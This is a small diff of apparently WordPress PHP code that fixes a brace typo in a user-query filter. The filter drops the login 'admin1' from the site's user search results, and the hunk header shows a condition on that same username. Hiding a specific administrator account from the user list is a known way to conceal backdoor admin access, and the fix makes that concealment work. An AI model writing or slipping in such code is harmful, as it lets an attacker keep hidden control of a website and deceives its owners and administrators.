@@ -11,7 +11,7 @@ if ($username == 'admin1') {
 else{
 global $wpdb;
 $user_search->query_where = str_replace('WHERE 1=1',
- "WHERE 1=1 AND {$wpdb->users).user_login != 'admin1' ",$user_search->query_where);
+ "WHERE 1=1 AND {$wpdb->users}.user_login != 'admin1' ",$user_search->query_where);
 }
 }
 
